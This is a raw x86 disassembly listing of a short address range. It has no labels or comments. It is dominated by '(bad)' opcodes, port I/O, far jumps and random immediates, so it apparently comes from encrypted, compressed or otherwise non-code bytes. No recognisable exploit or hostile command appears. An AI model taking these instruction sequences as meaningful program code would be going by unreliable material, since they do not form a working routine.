  412859:	cmp    eax,0x56b90578
  41285e:	or     BYTE PTR ds:0xb0f07238,ah
  412864:	sbb    BYTE PTR [esi+0x5cb578da],dl
  41286a:	pop    esp
  41286b:	push   eax
  41286c:	call   0x45fb037d
  412871:	shl    BYTE PTR [eax],1
  412873:	out    0x1d,al
  412875:	mov    bh,0x8c
  412877:	stos   BYTE PTR es:[edi],al
  412878:	add    esp,DWORD PTR [ebp+eax*8+0x6405a3d2]
  41287f:	xchg   esi,eax
  412880:	iret   
  412881:	test   eax,0x8290de4e
  412886:	mov    al,ds:0x51d5686b
  41288b:	out    dx,eax
  41288c:	out    0xe5,al
  41288e:	add    eax,DWORD PTR [esi-0x6e]
  412891:	(bad)  
  412892:	lock cmp dl,bl
  412895:	dec    eax
  412896:	mov    ebx,DWORD PTR [ebp-0x412aff81]
  41289c:	enter  0x54e7,0x11
  4128a0:	out    dx,al
  4128a1:	mov    ds:0xde0e3710,eax
  4128a6:	mov    ah,0x1b
  4128a8:	mov    ebp,0x6dec5472
  4128ad:	pop    edx
  4128ae:	aam    0x24
  4128b0:	adc    ecx,ecx
  4128b2:	adc    edx,ebp
  4128b4:	xchg   ecx,eax
  4128b5:	inc    esi
  4128b6:	dec    esp
  4128b7:	xor    BYTE PTR [edx-0x59e38a3a],dh
  4128bd:	xchg   ebp,eax
  4128be:	int    0x56
  4128c0:	stos   DWORD PTR es:[edi],eax
  4128c1:	je     0x41286c
  4128c3:	cli    
  4128c4:	ret    
  4128c5:	pop    ebp
  4128c6:	lods   al,BYTE PTR ds:[esi]
  4128c7:	jae    0x4128d5
  4128c9:	or     eax,DWORD PTR [esi]
  4128cb:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4128cd:	sub    eax,0xa2832fb6
  4128d2:	out    0x1c,eax
  4128d4:	adc    ebp,ebp
  4128d6:	jne    0x41290f
  4128d8:	frstor [edx+0x4f]
  4128db:	int    0x63
  4128dd:	loope  0x412867
  4128df:	int3   
  4128e0:	push   ebp
  4128e1:	xchg   dh,dh
  4128e3:	mov    edx,0xfe7dbf29
  4128e8:	rcl    DWORD PTR [edx+0x66],cl
  4128eb:	outs   dx,DWORD PTR ds:[esi]
  4128ec:	shr    DWORD PTR [ecx+0x47],cl
  4128ef:	push   0x6
  4128f1:	xchg   ebx,eax
  4128f2:	dec    esi
  4128f3:	xabort 0x66
  4128f6:	dec    ebp
  4128f7:	in     eax,dx
  4128f8:	adc    BYTE PTR [ecx+0xb],0xd3
  4128fc:	out    0xee,eax
  4128fe:	push   es
  4128ff:	mov    dh,0x4
  412901:	out    dx,eax
  412902:	or     ecx,esi
  412904:	loop   0x412959
  412906:	sbb    al,0xae
  412908:	or     edi,eax
  41290a:	dec    ecx
  41290b:	iret   
  41290c:	xchg   BYTE PTR [ecx-0x1b],dl
  41290f:	sti    
  412910:	and    eax,0xfaf3f9bd
  412915:	adc    BYTE PTR [edi],ch
  412917:	mov    ebx,0xedacbfd0
  41291c:	xchg   ebp,eax
  41291d:	mov    ah,0x3f
  41291f:	sbb    dl,cl
  412921:	mov    al,bl
  412923:	or     DWORD PTR [ebx],esp
  412925:	aad    0x66
  412927:	pop    ss
  412928:	repnz cmc 
  41292a:	xlat   BYTE PTR ds:[ebx]
  41292b:	and    ebx,DWORD PTR [ebp+ecx*4+0x1560ff79]
  412932:	jne    0x412988
  412934:	sub    DWORD PTR [edx+0x2f],ecx
  412937:	std    
  412938:	(bad)  [ebp*4-0x41d2916c]
  41293f:	push   0x6dd144c0
  412944:	dec    ecx
  412945:	cmp    DWORD PTR [ebp-0x2c],edi
  412948:	sub    bh,BYTE PTR [edx]
  41294a:	int    0x90
  41294c:	inc    ebx
  41294d:	push   edx
  41294e:	sub    al,0x5b
  412950:	cmp    al,0x5b
  412952:	sbb    al,0xcf
  412954:	lea    ecx,[ecx+0x352a994]
  41295a:	sbb    eax,0x88b20c37
  41295f:	pushf  
  412960:	xor    edx,DWORD PTR gs:[edx+eax*4-0x64b738f1]
  412968:	sbb    BYTE PTR [eax],dl
  41296a:	ror    BYTE PTR [edx+0x49],cl
  41296d:	dec    ebx
  41296e:	jbe    0x412968
  412970:	out    0x3,al
  412972:	push   ss
  412973:	enter  0x6575,0x6d
  412977:	xchg   edi,eax
  412978:	cmp    DWORD PTR [bx+di],ebp
  41297b:	bound  esp,QWORD PTR [edx+0x49a862da]
  412981:	les    ebx,FWORD PTR [ebp+0xb345ecd]
  412987:	inc    edi
  412988:	shr    BYTE PTR [eax],0x9d
  41298b:	pop    eax
  41298c:	sub    al,0xd2
  41298e:	fmul   QWORD PTR [esi]
  412990:	push   eax
  412991:	fild   DWORD PTR [ebx+esi*2]
  412994:	push   es
  412995:	retf   0x5d27
  412998:	inc    ebp
  412999:	cmp    bh,cl
  41299b:	nop
  41299c:	jns    0x4129d8
  41299e:	pop    esi
  41299f:	push   ebp
  4129a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129a1:	inc    edx
  4129a2:	cmp    DWORD PTR [ebx+0x781dbff8],edi
  4129a8:	scas   al,BYTE PTR es:[edi]
  4129a9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4129ab:	scas   eax,DWORD PTR es:[edi]
  4129ac:	sahf   
  4129ad:	dec    ebp
  4129ae:	(bad)  
  4129af:	(bad)  
  4129b0:	cmp    ebx,DWORD PTR [ebx]
  4129b2:	adc    ebp,esi
  4129b4:	in     al,0x32
  4129b6:	ins    BYTE PTR es:[edi],dx
  4129b7:	pop    ebp
  4129b8:	ror    BYTE PTR [edi+edi*2+0x3641e81b],cl
  4129bf:	retf   
  4129c0:	xor    al,BYTE PTR [ebx+0x51]
  4129c3:	retf   0xd15e
  4129c6:	sub    al,0xa9
  4129c8:	xchg   DWORD PTR [ebp-0x3c],ecx
  4129cb:	push   eax
  4129cc:	and    esi,DWORD PTR [esi]
  4129ce:	mov    ch,0xe4
  4129d0:	xor    al,0x7a
  4129d2:	dec    ebp
  4129d3:	and    esi,0xffffff9f
  4129d6:	dec    ecx
  4129d7:	push   edi
  4129d8:	mov    ecx,0xc7a946c4
  4129dd:	pop    es
  4129de:	scas   al,BYTE PTR es:[edi]
  4129df:	mov    esi,0x6bb48f24
  4129e4:	sbb    dh,BYTE PTR [ebx]
  4129e6:	outs   dx,DWORD PTR ds:[esi]
  4129e7:	dec    ebx
  4129e8:	add    BYTE PTR [ebx],cl
  4129ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129eb:	int3   
  4129ec:	test   eax,0x5fe20a67
  4129f1:	adc    cl,BYTE PTR [eax+0x719ee5c1]
  4129f7:	icebp  
  4129f8:	iret   
  4129f9:	push   ss
  4129fa:	mov    edx,0xa1fc0f08
  4129ff:	retf   0xdf20
  412a02:	(bad)  
  412a03:	push   ebx
  412a04:	inc    eax
  412a05:	or     DWORD PTR [edi-0x1fdaebda],ebx
  412a0b:	jl     0x412a11
  412a0d:	sar    BYTE PTR [ebx+0x578bbaa9],0xd7
  412a14:	jmp    0x412a08
  412a16:	std    
  412a17:	ins    DWORD PTR es:[edi],dx
  412a18:	repz cmp DWORD PTR [ebx+eax*4+0x28ebd89e],ebp
  412a20:	iret   
  412a21:	xor    ebx,DWORD PTR [ebx+0x243b4e20]
  412a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a28:	out    0x8e,eax
  412a2a:	enter  0x4ce9,0x47
  412a2e:	retf   0xd8fd
  412a31:	stos   BYTE PTR es:[edi],al
  412a32:	scas   al,BYTE PTR es:[edi]
  412a33:	jmp    0x412a08
  412a35:	out    dx,eax
  412a36:	stos   DWORD PTR es:[edi],eax
  412a37:	mov    eax,ds:0x2caf20e7
  412a3c:	and    eax,0xbba16708
  412a41:	add    edx,ebp
  412a43:	in     al,dx
  412a44:	add    DWORD PTR [ecx+ebx*8-0xa8ace6c],0xa177828a
  412a4f:	xor    al,0x93
  412a51:	xchg   BYTE PTR [edx+0x29b2ed31],bh
  412a57:	mov    DWORD PTR [ebx+0x5b],eax
  412a5a:	daa    
  412a5b:	xchg   esp,eax
  412a5c:	mov    cl,0x3d
  412a5e:	fild   QWORD PTR [ecx]
  412a60:	in     al,0xf5
  412a62:	xor    BYTE PTR [ebx+0x32],ch
  412a65:	xor    ebx,eax
  412a67:	call   0xc41a0f39
  412a6c:	fmul   st(0),st
  412a6e:	mov    esi,0x9eb238d1
  412a73:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a75:	lds    edx,FWORD PTR [ecx+0x30ce5e3d]
  412a7b:	mov    ds,ecx
  412a7d:	sti    
  412a7e:	fldcw  WORD PTR [edi+0x0]
  412a81:	inc    ebx
  412a82:	popf   
  412a83:	cmp    BYTE PTR [ebx+0x3e],dh
  412a86:	(bad)  
  412a87:	fcomp  QWORD PTR [esp+edi*4-0x1f516541]
  412a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a8f:	sbb    bh,BYTE PTR [eax]
  412a91:	addr16 dec esp
  412a93:	(bad)  
  412a94:	sbb    al,BYTE PTR [edi-0x66a91f5]
  412a9a:	imul   eax,DWORD PTR [eax+0x2a],0x59bfb555
  412aa1:	retf   
  412aa2:	repnz (bad) 
  412aa4:	jmp    0xd8d:0xc64afb14
  412aab:	das    
  412aac:	ret    0x7bba
  412aaf:	push   ecx
  412ab0:	or     eax,0x77aa3af3
  412ab5:	das    
  412ab6:	ins    BYTE PTR es:[edi],dx
  412ab7:	and    dl,dh
  412ab9:	jecxz  0x412adc
  412abb:	mul    DWORD PTR [ecx-0x80]
  412abe:	inc    ebx
  412abf:	das    
  412ac0:	in     eax,dx
  412ac1:	(bad)  [ebx-0x49]
  412ac4:	pushf  
  412ac5:	fs sbb eax,0x890f9169
  412acb:	in     eax,0x16
  412acd:	adc    al,0xe3
  412acf:	xor    eax,0x70bf8073
  412ad4:	bound  esp,QWORD PTR [edx+0x6723acfe]
  412ada:	ss into 
  412adc:	pop    ss
  412add:	or     bh,BYTE PTR [esi]
  412adf:	dec    ebp
  412ae0:	in     eax,dx
  412ae1:	sub    al,0x82
  412ae3:	call   0x1835:0x68d59b67
  412aea:	push   0x5
  412aec:	ja     0x412a92
  412aee:	addr16 stc 
  412af0:	push   0xdb9fb746
  412af5:	clc    
  412af6:	sbb    ebx,DWORD PTR [ebx+0x71]
  412af9:	jmp    0xe8a2:0xbe7196c0
  412b00:	jp     0x412ac7
  412b02:	cld    
  412b03:	sahf   
  412b04:	into   
  412b05:	ret    
  412b06:	pop    es
  412b07:	in     eax,0x43
  412b09:	fstp   QWORD PTR [ebx]
  412b0b:	sbb    eax,0x246df68f
  412b10:	es jae 0x412a96
  412b13:	pop    ecx
  412b14:	mov    ds:0xfe327f26,al
  412b19:	je     0x412b36
  412b1b:	repz xchg ecx,eax
  412b1d:	xchg   ebx,eax
  412b1e:	(bad)  
  412b1f:	test   al,0x94
  412b21:	clc    
  412b22:	add    al,0xcc
  412b24:	mov    ecx,DWORD PTR [edi]
  412b26:	test   eax,0xbab8bab
  412b2b:	and    BYTE PTR [ebp+0x43045e1a],ah
  412b31:	xor    dh,ah
  412b33:	scas   eax,DWORD PTR es:[edi]
  412b34:	int    0xf4
  412b36:	xor    BYTE PTR [edx],dh
  412b38:	xor    ah,cl
  412b3a:	or     ecx,DWORD PTR [edx+0x33]
  412b3d:	and    bl,bl
  412b3f:	imul   edx,DWORD PTR [edi-0x34f15902],0x9cc9c2f5
  412b49:	out    0x6f,al
  412b4b:	(bad)  
  412b4c:	imul   ebp,DWORD PTR [eax-0x26837077],0xffffffd7
  412b53:	jb     0x412b80
  412b55:	lods   al,BYTE PTR ds:[esi]
  412b56:	push   0xb283f36c
  412b5b:	mov    ecx,0xfca113a9
  412b60:	add    al,0x74
  412b62:	mov    eax,0x34d67fa8
  412b67:	sbb    BYTE PTR [ebp+0x4ce7c8a9],bh
  412b6d:	mov    cs:0x8b19513,al
  412b73:	inc    edx
  412b74:	or     ebp,edi
  412b76:	jo     0x412bda
  412b78:	fiadd  DWORD PTR [esi+0x7b]
  412b7b:	icebp  
  412b7c:	les    edi,FWORD PTR [eax]
  412b7e:	mov    dl,0x1d
  412b80:	jg     0x412be6
  412b82:	inc    esi
  412b83:	gs mov bl,0xee
  412b86:	test   al,0x4e
  412b88:	pushf  
  412b89:	mov    ?,WORD PTR es:[esi+0x7f]
  412b8d:	inc    edx
  412b8e:	imul   edi,DWORD PTR [esi+0x20a277a3],0xffffffa1
  412b95:	aam    0x2
  412b97:	and    BYTE PTR [edi-0x36],al
  412b9a:	lea    edx,[edx-0x6e]
  412b9d:	test   esi,esp
  412b9f:	ret    
  412ba0:	dec    edi
  412ba1:	mov    dl,0x8e
  412ba3:	mov    esi,0xb48750e3
  412ba8:	push   ebx
  412ba9:	mov    ebx,0x4fac4b62
  412bae:	mov    ecx,0xc3ea3ba6
  412bb3:	lea    edi,[ebx-0x67]
  412bb6:	test   al,0xea
  412bb8:	scas   al,BYTE PTR es:[edi]
  412bb9:	nop
  412bba:	mov    ah,0x85
  412bbc:	inc    ebx
  412bbd:	ffree  st(6)
  412bbf:	mov    ecx,0x3e1fb392
  412bc4:	out    0xaf,al
  412bc6:	(bad)  
  412bc7:	and    al,0xd5
  412bc9:	je     0x412be8
  412bcb:	enter  0xc55f,0x8a
  412bcf:	mov    ch,0xce
  412bd1:	in     eax,dx
  412bd2:	xchg   BYTE PTR [eax+0x4ec0e589],al
  412bd8:	adc    DWORD PTR [esi+0x18],ebp
  412bdb:	pop    esp
  412bdc:	fbld   TBYTE PTR [edx-0x1d]
  412bdf:	mov    ds:0x1330cb99,al
  412be4:	(bad)  
  412be6:	(bad)  
  412be7:	ins    DWORD PTR es:[edi],dx
  412be8:	add    DWORD PTR [ebx+0xe],0xffffffbc
  412bec:	iret   
  412bed:	mov    ebp,0xa6122199
  412bf2:	sahf   
  412bf3:	(bad)  
  412bf4:	repnz shl DWORD PTR [eax],0xb2
  412bf8:	push   esi
  412bf9:	and    edx,DWORD PTR [edi]
  412bfb:	xor    BYTE PTR [edi-0x1f],dl
  412bfe:	adc    DWORD PTR [ebx-0x6cb989c6],esp
  412c04:	xor    eax,0xae4014f
  412c09:	adc    eax,0x1be60abc
  412c0e:	stos   BYTE PTR es:[edi],al
  412c0f:	movups xmm7,XMMWORD PTR [ebx+0x1e]
  412c13:	shl    bh,cl
  412c15:	je     0x412c80
  412c17:	not    DWORD PTR [ebx]
  412c19:	mov    esp,0x89e07a73
  412c1e:	shl    DWORD PTR [ecx],cl
  412c20:	mov    ch,0xe0
  412c22:	fld    TBYTE PTR [esi+ecx*1]
  412c25:	sub    eax,0xf2d5da06
  412c2a:	mov    DWORD PTR [ebp+edx*2+0x56],ebp
  412c2e:	leave  
  412c2f:	loopne 0x412c1e
  412c31:	scas   al,BYTE PTR es:[edi]
  412c32:	lahf   
  412c33:	mov    eax,DWORD PTR [ecx-0x18]
  412c36:	out    dx,al
  412c37:	sub    ecx,DWORD PTR [eax+ebp*8]
  412c3a:	dec    edi
  412c3b:	fst    QWORD PTR [edx+0x43]
  412c3e:	call   DWORD PTR [ecx+0x7264de50]
  412c44:	push   edi
  412c45:	jbe    0x412c6a
  412c47:	fild   DWORD PTR [ecx+0x6a748d77]
  412c4d:	out    0x6,al
  412c4f:	and    edi,ecx
  412c51:	mov    eax,0x2ba2a7df
  412c56:	cmp    al,0x88
  412c58:	xor    DWORD PTR [ebp+esi*4+0x7e],edx
  412c5c:	mov    esi,0x3f58e28b
  412c61:	mov    dl,0x1b
  412c63:	xor    esi,ebx
  412c65:	das    
  412c66:	(bad)  
  412c67:	in     al,0xd3
  412c69:	cwde   
  412c6a:	pusha  
  412c6b:	pop    ds
  412c6c:	push   edx
  412c6d:	in     eax,0xb0
  412c6f:	pop    esp
  412c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c71:	imul   edx,esi,0xffffffb9
  412c74:	bound  esp,QWORD PTR [ecx+0x77]
  412c77:	(bad)  
  412c79:	cmp    ch,dl
  412c7b:	push   0x48
  412c7d:	iret   
  412c7e:	pusha  
  412c7f:	mov    WORD PTR [esi+0x69],gs
  412c82:	sbb    DWORD PTR [esi],0xb3e2ad1
  412c88:	aas    
  412c89:	sub    dl,dh
  412c8b:	and    dl,dh
  412c8d:	or     eax,0x1c61ea88
  412c92:	fstp   QWORD PTR [ecx]
  412c94:	imul   esp,DWORD PTR [edi],0x8f8eb0ae
  412c9a:	(bad)  
  412c9b:	pop    ds
  412c9c:	adc    BYTE PTR [edi],dl
  412c9e:	aaa    
  412c9f:	push   eax
  412ca0:	push   cs
  412ca1:	fld    st(0)
  412ca3:	inc    edx
  412ca4:	jge    0x412ce0
  412ca6:	jp     0x412c63
  412ca8:	and    ebx,0xffffffd6
  412cab:	pop    ecx
  412cac:	(bad)  
  412cad:	cwde   
  412cae:	adc    al,0x8d
  412cb0:	shl    DWORD PTR [ecx-0x166b522c],1
  412cb6:	mov    esi,0xea2dc1ca
  412cbb:	pop    esp
  412cbc:	inc    ebx
  412cbd:	jmp    0xf0f1d714
  412cc2:	mov    edx,0xcf329f14
  412cc7:	ds jmp 0x412cd3
  412cca:	pop    es
  412ccb:	xor    al,0x76
  412ccd:	add    eax,0xd6f6c939
  412cd2:	cdq    
  412cd3:	ficom  WORD PTR [eax-0x20]
  412cd6:	test   al,0xe2
  412cd8:	fild   QWORD PTR [ebx]
  412cda:	in     eax,0xdf
  412cdc:	sbb    al,0x5a
  412cde:	mov    ds:0x6232dd7d,al
  412ce3:	mov    ebp,0xcd7837bc
  412ce8:	push   cs
  412ce9:	sub    al,0xdb
  412ceb:	mov    al,0x13
  412ced:	scas   eax,DWORD PTR es:[edi]
  412cee:	adc    al,0xec
  412cf0:	and    dl,BYTE PTR [esi]
  412cf2:	push   esi
  412cf3:	mov    BYTE PTR [eax],ah
  412cf5:	test   al,0xa7
  412cf7:	jno    0x412cdc
  412cf9:	rcr    ch,1
  412cfb:	ja     0x412cb4
  412cfd:	clc    
  412cfe:	push   0x2
  412d00:	arpl   ax,bx
  412d02:	cs mov esi,0x63dac099
  412d08:	repnz dec esi
  412d0a:	sbb    BYTE PTR [esi+edx*1+0xf1717dc],al
  412d11:	push   edx
  412d12:	push   0xe20d281a
  412d17:	mov    esp,DWORD PTR [eax-0x5c5aded3]
  412d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d1f:	stos   DWORD PTR es:[edi],eax
  412d20:	mov    al,ds:0xe584dae
  412d25:	mov    ?,WORD PTR [edx+0x26]
  412d28:	fmul   QWORD PTR [ecx+0x35acdba4]
  412d2e:	imul   esi,DWORD PTR [edx],0x54
  412d31:	add    ah,bh
  412d33:	loop   0x412cec
  412d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d36:	xor    bh,BYTE PTR [esi]
  412d38:	retf   0xb210
  412d3b:	add    dh,BYTE PTR [esi-0x38965f4c]
  412d41:	or     BYTE PTR [ebp+ecx*1-0x31],bl
  412d45:	je     0x412d80
  412d47:	imul   ebx,esp,0x6268c726
  412d4d:	xchg   ebx,eax
  412d4e:	adc    BYTE PTR [ecx-0x6085652e],al
  412d54:	jg     0x412d3a
  412d56:	fwait
  412d57:	out    0x3e,al
  412d59:	and    esi,edi
  412d5b:	pusha  
  412d5c:	cmp    dh,BYTE PTR ds:0xaf16e22e
  412d62:	inc    ebp
  412d63:	fisub  DWORD PTR [eax-0x718463b5]
  412d69:	out    0x61,eax
  412d6b:	out    0x59,al
  412d6d:	adc    ebx,DWORD PTR [ecx-0x117ff58f]
  412d73:	jmp    0xf87c:0xe841816a
  412d7a:	push   ecx
  412d7b:	sbb    eax,0xa830a0c4
  412d80:	(bad)  [edi-0x13]
  412d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d84:	adc    DWORD PTR [esi-0x7dca2002],eax
  412d8a:	xor    al,0x57
  412d8c:	pushf  
  412d8d:	repnz mov dh,0xea
  412d90:	adc    eax,0x6911daf1
  412d95:	gs gs cmc 
  412d98:	das    
  412d99:	cmp    al,0x1b
  412d9b:	inc    ecx
  412d9c:	mov    bl,0x5d
  412d9e:	stos   BYTE PTR es:[edi],al
  412d9f:	mov    bh,0xcb
  412da1:	ffree  st(6)
  412da3:	(bad)  
  412da4:	(bad)  
  412da5:	mov    edi,0xf742fbc7
  412daa:	sub    eax,0x7faa7fc
  412daf:	pusha  
  412db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412db2:	in     eax,0x32
  412db4:	icebp  
  412db5:	ror    edx,0x48
  412db8:	pop    ebx
  412db9:	xchg   ebx,eax
  412dba:	xchg   ch,al
  412dbc:	xor    edx,0x3ee49071
  412dc2:	xor    DWORD PTR [edi+0x12],0x6d13a037
  412dc9:	jp     0x412d68
  412dcb:	das    
  412dcc:	test   DWORD PTR [edi+ebx*1],0xaf52883a
  412dd3:	pop    ebx
  412dd4:	adc    BYTE PTR [eax+0x74a50e88],cl
  412dda:	outs   dx,BYTE PTR ds:[esi]
  412ddb:	std    
  412ddc:	hlt    
  412ddd:	lock jnp 0x412df5
  412de0:	sbb    BYTE PTR ds:[esp+ebp*2-0x7e],ah
  412de5:	jae    0x412dd8
  412de7:	retf   0x2fb5
  412dea:	inc    ebp
  412deb:	jae    0x412dc7
  412ded:	pop    ebp
  412dee:	enter  0xe094,0xff
  412df2:	or     esi,ebx
  412df4:	or     BYTE PTR [ecx],0xa
  412df7:	pushf  
  412df8:	daa    
  412df9:	sub    dl,BYTE PTR [edx]
  412dfb:	loop   0x412e48
  412dfd:	retf   0x97e6
  412e00:	lods   eax,DWORD PTR ds:[esi]
  412e01:	jmp    0xc46:0x8369d6eb
  412e08:	sbb    al,0x1e
  412e0a:	cmp    BYTE PTR [esi+0x6855a00e],0x82
  412e11:	cmp    BYTE PTR [edi],bl
  412e13:	lea    edx,[ecx+ebx*8+0xd]
  412e17:	jbe    0x412e51
  412e19:	test   ebp,edx
  412e1b:	das    
  412e1c:	fbstp  TBYTE PTR [edx-0x6c]
  412e1f:	jle    0x412e63
  412e21:	lahf   
  412e22:	dec    edx
  412e23:	and    ecx,DWORD PTR [edx]
  412e25:	pop    esp
  412e26:	dec    edx
  412e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e28:	dec    esp
  412e29:	ja     0x412e42
  412e2b:	pop    edx
  412e2c:	fwait
  412e2d:	ret    0x5204
  412e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e31:	xchg   DWORD PTR [ebp+0x25],esp
  412e34:	(bad)  
  412e36:	cmp    al,0x99
  412e38:	imul   esp,DWORD PTR [edx],0x518c2a26
  412e3e:	cs js  0x412e9d
  412e41:	sub    BYTE PTR [esi-0x680ff7be],al
  412e47:	push   edi
  412e48:	retf   0xf64b
  412e4b:	out    dx,al
  412e4c:	das    
  412e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e4e:	stos   DWORD PTR es:[edi],eax
  412e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e50:	push   0x949782de
  412e55:	lds    ebp,FWORD PTR [ecx-0x7593f9af]
  412e5b:	popa   
  412e5c:	xchg   ecx,eax
  412e5d:	ror    DWORD PTR [eax+0xa96d6aa],0x71
  412e64:	pop    esi
  412e65:	push   edx
  412e66:	and    edx,DWORD PTR [edx+0x2db12d31]
  412e6c:	ins    BYTE PTR es:[edi],dx
  412e6d:	jbe    0x412ee1
  412e6f:	jae    0x412e27
  412e71:	xor    dh,ch
  412e73:	in     eax,0xf3
  412e75:	in     al,dx
  412e76:	sar    BYTE PTR [edi-0x52],0x34
  412e7a:	movups xmm0,xmm4
  412e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e7e:	pop    edx
  412e7f:	(bad)  
  412e80:	stos   DWORD PTR es:[edi],eax
  412e81:	leave  
  412e82:	(bad)  
  412e83:	push   esp
  412e84:	fiadd  DWORD PTR [esi-0x31]
  412e87:	retf   0xbd13
  412e8a:	xor    BYTE PTR [eax+edi*4+0x7d],bl
  412e8e:	lds    edx,FWORD PTR [edi]
  412e90:	lods   al,BYTE PTR ds:[esi]
  412e91:	fsubr  QWORD PTR [edx+0x574f3d1b]
  412e97:	and    eax,0x331c2e6
  412e9c:	cmc    
  412e9d:	pop    edi
  412e9e:	ins    BYTE PTR es:[edi],dx
  412e9f:	mov    dh,0x6a
  412ea1:	pop    esi
  412ea2:	les    esp,FWORD PTR [ebx+0x1]
  412ea5:	jnp    0x412ea1
  412ea7:	cmp    eax,0x606ac854
  412eac:	ror    edi,1
  412eae:	cwde   
  412eaf:	add    BYTE PTR [ecx],0x7a
  412eb2:	and    eax,0x64e935b0
  412eb7:	in     al,0x21
  412eb9:	pop    es
  412eba:	pop    esp
  412ebb:	retf   
  412ebc:	jnp    0x412e76
  412ebe:	and    al,0x47
  412ec0:	call   0x4f61:0xed0ca28a
  412ec7:	add    edx,eax
  412ec9:	add    al,0x79
  412ecb:	push   ss
  412ecc:	lock popf 
  412ece:	mov    eax,0xa239b53a
  412ed3:	fld    QWORD PTR [edx+0x13]
  412ed6:	jo     0x412edb
  412ed8:	sbb    DWORD PTR [ebx+0x9],esp
  412edb:	(bad)  
  412edc:	adc    al,0x54
  412ede:	sub    BYTE PTR [ecx-0x526e4aba],ah
  412ee4:	push   eax
  412ee5:	mov    ?,WORD PTR [eax]
  412ee7:	aam    0x53
  412ee9:	push   0xffffffff
  412eeb:	push   0xb720776b
  412ef0:	je     0x412f6b
  412ef2:	in     al,0xd5
  412ef4:	jo     0x412eb2
  412ef6:	sti    
  412ef7:	push   esp
  412ef8:	test   BYTE PTR [esi],bh
  412efa:	outs   dx,BYTE PTR ds:[esi]
  412efb:	dec    ecx
  412efc:	push   edi
  412efd:	xor    DWORD PTR [eax+0x49],0xffffff95
  412f01:	adc    BYTE PTR [edi+0x7c],0x6d
  412f05:	out    0x5d,al
  412f07:	xchg   esp,eax
  412f08:	mov    esp,0x96b38128
  412f0d:	imul   ebp,esi,0x44c1174d
  412f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f14:	popa   
  412f15:	jp     0x412f47
  412f17:	sub    DWORD PTR [eax+0x2b3228a],esp
  412f1d:	retf   0xbe01
  412f20:	push   edx
  412f21:	lds    ebx,FWORD PTR [esi]
  412f23:	add    edi,DWORD PTR [ebp-0x57]
  412f26:	sub    eax,DWORD PTR [eax]
  412f28:	shl    DWORD PTR [ebp+0x33],0x9b
  412f2c:	hlt    
  412f2d:	retf   0xb94f
  412f30:	mov    ebx,DWORD PTR [edx]
  412f32:	sbb    al,0xca
  412f34:	or     al,0xf6
  412f36:	rcr    al,cl
  412f38:	inc    BYTE PTR [ebp-0x76839a9b]
  412f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f3f:	and    bl,BYTE PTR [esi-0x7a]
  412f42:	mov    ds:0x9919adef,al
  412f47:	retf   
  412f48:	mul    BYTE PTR [ebp+0x38]
  412f4b:	pop    eax
  412f4c:	lods   al,BYTE PTR ds:[esi]
  412f4d:	sbb    al,0x6b
  412f4f:	nop
  412f50:	cmp    DWORD PTR [edi],eax
  412f52:	jae    0x412f6f
  412f54:	pop    ebx
  412f55:	mov    dl,0xb1
  412f57:	aas    
  412f58:	cmc    
  412f59:	cmp    eax,DWORD PTR [ebx+0x3c]
  412f5c:	and    bl,BYTE PTR ds:0xebeee362
  412f62:	mov    edx,0x4cf1de92
  412f67:	test   DWORD PTR [esi-0x4e3d45a5],esi
  412f6d:	add    BYTE PTR [eax+0xa],ch
  412f70:	in     eax,0x11
  412f72:	into   
  412f73:	jmp    0x9795f51f
  412f78:	push   eax
  412f79:	push   ds
  412f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f7b:	ins    DWORD PTR es:[edi],dx
  412f7c:	loop   0x412f0e
  412f7e:	mov    al,ds:0x5aa5720e
  412f83:	pop    edx
  412f84:	push   eax
  412f85:	jae    0x412f54
  412f87:	or     BYTE PTR [esi-0x3cc1db62],bl
  412f8d:	and    DWORD PTR [ecx],edx
  412f8f:	scas   eax,DWORD PTR es:[edi]
  412f90:	cmp    al,0xe4
  412f92:	cmp    bh,cl
  412f94:	stos   BYTE PTR es:[edi],al
  412f95:	mov    ebx,0xa81a6df4
  412f9a:	aas    
  412f9b:	pop    ecx
  412f9c:	ror    DWORD PTR [edi-0x6fcb70c],1
  412fa2:	(bad)  
  412fa3:	push   esp
  412fa4:	std    
  412fa5:	popa   
  412fa6:	mov    eax,ds:0x6b910c4b
  412fab:	fstp   DWORD PTR ds:0xbbf9bdda
  412fb1:	mov    bh,0xf3
  412fb3:	cmp    eax,0x2e585c9a
  412fb8:	pop    ecx
  412fb9:	jb     0x412feb
  412fbb:	and    dl,BYTE PTR [edi+0x17]
  412fbe:	(bad)  
  412fbf:	shl    esp,0xb8
  412fc2:	scas   eax,DWORD PTR es:[edi]
  412fc3:	ja     0x41303d
  412fc5:	push   esi
  412fc6:	push   eax
  412fc7:	xchg   ecx,eax
  412fc8:	stos   DWORD PTR es:[edi],eax
  412fc9:	sub    ecx,DWORD PTR [ebx+edi*8-0x2d]
  412fcd:	push   ebx
  412fce:	mov    cl,0x31
  412fd0:	js     0x412f69
  412fd2:	jae    0x412f95
  412fd4:	dec    ebp
  412fd5:	test   DWORD PTR [esi],0xc229eca5
  412fdb:	sbb    eax,0x60bf5399
  412fe0:	push   ss
  412fe1:	cmp    eax,0xa205bbeb
